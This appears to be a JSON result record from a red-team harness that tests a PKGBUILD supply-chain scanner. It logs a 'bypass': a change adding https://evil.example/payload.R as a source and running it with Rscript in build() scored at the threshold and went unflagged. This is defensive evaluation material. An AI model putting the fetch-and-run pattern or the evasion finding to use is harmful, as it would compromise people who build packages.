@@ -1,0 +1,190 @@
+{
+  "attempt": 0,
+  "cost": {},
+  "db_hash": "sha256:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+  "diff_sha256": "sha256:9ba5fde582dfb1c71e0d55db0c52df80c604027d645c5cf73d5bcdf689038526",
+  "generator": {
+    "directory": "campaigns/rscript-solo/manual",
+    "inputs": 1,
+    "type": "manual"
+  },
+  "judge": {
+    "catching_rules": [],
+    "coverage_gaps": [],
+    "fatal": false,
+    "rationale": "score 20 <= threshold 20; coverage_gaps empty; no fatal",
+    "verdict": "bypass"
+  },
+  "stages": {
+    "_text_source": "generator",
+    "behavior": {
+      "chain": "source= -> Rscript \"$srcdir/payload.R\"",
+      "preserved": true,
+      "reason": "",
+      "validator_version": "sha256:1cf585b73235c107a8ce4c9757d7ad27636bed9d18eda3a4d33f074001b0b198"
+    },
+    "constraints": {
+      "honored": true,
+      "violated": []
+    },
+    "sanitization": {
+      "passed": true,
+      "reason": ""
+    },
+    "syntax": {
+      "bash_n_new": 0,
+      "bash_n_old": 0,
+      "reason": ""
+    }
+  },
+  "status": "bypass",
+  "trustsight": {
+    "config_fingerprint": "sha256:674ed4b8bef677140dfac9d70671a3dea5221fb93c0d3f35cf17036c55baccb1",
+    "report": {
+      "changes": [
+        "checksums added or changed",
+        "source host changed: evil.example"
+      ],
+      "config_fingerprint": "sha256:674ed4b8bef677140dfac9d70671a3dea5221fb93c0d3f35cf17036c55baccb1",
+      "coverage_gaps": [
+        "tree_not_analyzed"
+      ],
+      "dependencies": [],
+      "depth_truncated": false,
+      "diff_truncated": false,
+      "failed": false,
+      "file_changes": [],
+      "findings": [
+        {
+          "description": "Source URL classified as unknown (https://evil.example/payload.R) [SOURCE_BUCKET]",
+          "evidence": {},
+          "file": "",
+          "line": null,
+          "rule_id": "SOURCE_BUCKET",
+          "severity": "MEDIUM",
+          "template": ""
+        }
+      ],
+      "first_seen": false,
+      "flagged": false,
+      "fully_vetted": false,
+      "ioc_matches": [],
+      "is_trivial": true,
+      "new_commit": "",
+      "new_version": "1.0.0",
+      "old_commit": "",
+      "old_version": "1.0.0",
+      "package": "harness-pkg",
+      "required_by": [],
+      "review_profile": "default",
+      "review_threshold": 20,
+      "risk": "Inconclusive",
+      "risk_label": "Inconclusive (repository files not examined: payload may be hidden)",
+      "scan_truncated": false,
+      "score": 20,
+      "score_breakdown": [
+        {
+          "evidence": {
+            "added": "['https://evil.example/payload.R', 'https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz']",
+            "match": "URLs changed: ['https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz'] -> ['https://evil.example/payload.R', 'https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz']",
+            "removed": "['https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz']"
+          },
+          "file": "PKGBUILD",
+          "line": 14,
+          "params": {
+            "added": "['https://evil.example/payload.R', 'https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz']",
+            "removed": "['https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz']"
+          },
+          "reason": "Source URL Changed Without Version Bump: URLs changed: ['https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz'] -> ['https://evil.example/payload.R', 'https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz']",
+          "rule_id": "C003",
+          "severity": "INFO",
+          "template": "source URLs changed without version bump",
+          "weight": 0
+        },
+        {
+          "evidence": {
+            "match": "diff modifies build()",
+            "touched": "build"
+          },
+          "file": "PKGBUILD",
+          "line": null,
+          "params": {
+            "touched": "build"
+          },
+          "reason": "Critical Build Function Modified: diff modifies build()",
+          "rule_id": "R060",
+          "severity": "INFO",
+          "template": "critical build function modified: {touched}",
+          "weight": 0
+        },
+        {
+          "evidence": {
+            "gap": "tree_not_analyzed"
+          },
+          "file": "",
+          "line": null,
+          "params": {
+            "gap": "tree_not_analyzed"
+          },
+          "reason": "Coverage gap: the repository file manifest was unavailable, so only the PKGBUILD was examined",
+          "rule_id": "COVERAGE",
+          "severity": "INFO",
+          "template": "",
+          "weight": 0
+        },
+        {
+          "evidence": {},
+          "file": "",
+          "line": null,
+          "params": {},
+          "reason": "Source URL classified as unknown (https://evil.example/payload.R)",
+          "rule_id": "SOURCE_BUCKET",
+          "severity": "MEDIUM",
+          "template": "",
+          "weight": 20
+        },
+        {
+          "evidence": {
+            "count": 1
+          },
+          "file": "",
+          "line": null,
+          "params": {
+            "count": 1
+          },
+          "reason": "source hosted on a trusted forge over HTTPS",
+          "rule_id": "P007",
+          "severity": "INFO",
+          "template": "",
+          "weight": 0
+        },
+        {
+          "evidence": {},
+          "file": "",
+          "line": null,
+          "params": {},
+          "reason": "source pinned to a full commit hash",
+          "rule_id": "P005",
+          "severity": "INFO",
+          "template": "",
+          "weight": 0
+        },
+        {
+          "evidence": {},
+          "file": "",
+          "line": null,
+          "params": {},
+          "reason": "checksums declared for all non-VCS sources",
+          "rule_id": "P001",
+          "severity": "INFO",
+          "template": "",
+          "weight": 0
+        }
+      ],
+      "suppressed_rules": [],
+      "verdict": "This analysis was incomplete: the repository file manifest was unavailable, so only the PKGBUILD was examined. The result describes what was examined, not the whole change. Version bump. added 2 source URL(s). Signals: Source URL classified as unknown (https://evil.example/payload.R) [SOURCE_BUCKET]. Review the diff before building.",
+      "version_comparison": ""
+    },
+    "wall_clock_ms": 964
+  }
+}
